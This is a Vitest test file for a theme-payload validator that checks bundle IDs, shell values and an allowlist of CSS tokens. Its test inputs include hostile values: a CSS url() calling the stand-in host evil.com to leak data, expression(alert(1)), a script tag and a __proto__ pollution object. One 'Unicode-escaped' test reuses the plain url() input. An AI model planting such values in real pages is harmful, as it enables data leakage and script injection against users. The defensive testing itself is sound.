import { describe, it, expect } from "vitest";
import { validateThemePayload } from "../domains/plugins.js";

// v2 helper: a full ThemeProvider v2 payload shape
const V2_PAYLOAD = {
  bundleId: "tokyo-night",
  shell: "dark",
} as const;

describe("validateThemePayload", () => {
  it("accepts a valid bundleId + shell (dark)", () => {
    const result = validateThemePayload({ bundleId: "tokyo-night", shell: "dark" });
    expect(result).toEqual({ ok: true, safe: { bundleId: "tokyo-night", shell: "dark" } });
  });

  it("accepts light shell", () => {
    const result = validateThemePayload({ bundleId: "lge-light", shell: "light" });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.bundleId).toBe("lge-light");
      expect(result.safe.shell).toBe("light");
    }
  });

  it("accepts high-contrast bundle", () => {
    const result = validateThemePayload({ bundleId: "high-contrast", shell: "dark" });
    expect(result.ok).toBe(true);
  });

  it("rejects null", () => {
    const result = validateThemePayload(null);
    expect(result).toEqual({ ok: false, error: "invalid-payload" });
  });

  it("rejects non-object", () => {
    expect(validateThemePayload("dark")).toEqual({ ok: false, error: "invalid-payload" });
  });

  it("rejects unknown bundleId", () => {
    const result = validateThemePayload({ bundleId: "sepia", shell: "light" });
    expect(result).toEqual({ ok: false, error: "invalid-bundle-id" });
  });

  it("rejects missing bundleId", () => {
    const result = validateThemePayload({ shell: "dark" });
    expect(result).toEqual({ ok: false, error: "invalid-bundle-id" });
  });

  it("rejects unknown shell value", () => {
    const result = validateThemePayload({ bundleId: "tokyo-night", shell: "auto" });
    expect(result).toEqual({ ok: false, error: "invalid-shell" });
  });

  it("rejects missing shell", () => {
    const result = validateThemePayload({ bundleId: "tokyo-night" });
    expect(result).toEqual({ ok: false, error: "invalid-shell" });
  });

  it("rejects extra injected fields — safe output has only bundleId/shell keys", () => {
    const result = validateThemePayload({
      bundleId: "midnight", shell: "dark",
      evil: "injected", __proto__: { polluted: true },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.bundleId).toBe("midnight");
      expect(result.safe.shell).toBe("dark");
      expect(result.safe.tokens).toBeUndefined();
      expect((result.safe as Record<string, unknown>).evil).toBeUndefined();
    }
  });

  it("passes through valid --lvis-* tokens", () => {
    const result = validateThemePayload({
      bundleId: "lge-dark", shell: "dark",
      tokens: { "--lvis-bg": "hsl(0, 0%, 15%)", "--lvis-primary": "#734dff" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toEqual({ "--lvis-bg": "hsl(0, 0%, 15%)", "--lvis-primary": "#734dff" });
    }
  });

  it("drops token keys not in the closed PLUGIN_TOKEN_NAMES allowlist", () => {
    const result = validateThemePayload({
      bundleId: "tokyo-night", shell: "dark",
      tokens: { "--lvis-bg": "#fff", "--lvis-unknown-new": "#abc", "--evil-key": "red", "color": "blue" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toEqual({ "--lvis-bg": "#fff" });
    }
  });

  it("drops token values with url() injection", () => {
    const result = validateThemePayload({
      bundleId: "tokyo-night", shell: "dark",
      tokens: { "--lvis-bg": "url(https://evil.com?leak=1)" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toBeUndefined();
    }
  });

  it("drops token values with expression() injection", () => {
    const result = validateThemePayload({
      bundleId: "tokyo-night", shell: "dark",
      tokens: { "--lvis-bg": "expression(alert(1))" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toBeUndefined();
    }
  });

  it("drops token values with HTML tag injection", () => {
    const result = validateThemePayload({
      bundleId: "tokyo-night", shell: "dark",
      tokens: { "--lvis-bg": "<script>x</script>" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toBeUndefined();
    }
  });

  it("does not include tokens key when all token entries are invalid", () => {
    const result = validateThemePayload({
      bundleId: "tokyo-night", shell: "dark",
      tokens: { "--evil": "red" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toBeUndefined();
    }
  });

  it("accepts tokens=undefined gracefully", () => {
    const result = validateThemePayload({ bundleId: "tokyo-night", shell: "dark" });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toBeUndefined();
    }
  });

  it("drops token values with Unicode-escaped url() — allowlist blocks bypass attempts", () => {
    const result = validateThemePayload({
      bundleId: "tokyo-night", shell: "dark",
      tokens: { "--lvis-bg": "url(https://evil.com?leak=1)" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toBeUndefined();
    }
  });

  it("drops var() references — only literal HSL/hex/dimension values pass", () => {
    const result = validateThemePayload({
      bundleId: "tokyo-night", shell: "dark",
      tokens: { "--lvis-bg": "var(--p-secret-color)" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toBeUndefined();
    }
  });

  it("accepts hsl with decimal values and hex colors", () => {
    const result = validateThemePayload({
      bundleId: "lge-dark", shell: "dark",
      tokens: { "--lvis-radius": "0.6rem", "--lvis-radius-sm": "0.25rem", "--lvis-primary": "#734dff" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toEqual({ "--lvis-radius": "0.6rem", "--lvis-radius-sm": "0.25rem", "--lvis-primary": "#734dff" });
    }
  });

  it("accepts all 6 valid bundleIds", () => {
    const cases: Array<[string, "light" | "dark"]> = [
      ["tokyo-night", "dark"],
      ["midnight", "dark"],
      ["forest", "light"],
      ["lge-light", "light"],
      ["lge-dark", "dark"],
      ["high-contrast", "dark"],
    ];
    for (const [bundleId, shell] of cases) {
      const result = validateThemePayload({ bundleId, shell });
      expect(result.ok, `bundleId=${bundleId}`).toBe(true);
      if (result.ok) expect(result.safe.bundleId).toBe(bundleId);
    }
  });

  it("v2 payload (V2_PAYLOAD const) round-trips correctly", () => {
    const result = validateThemePayload(V2_PAYLOAD);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.bundleId).toBe("tokyo-night");
      expect(result.safe.shell).toBe("dark");
    }
  });
});
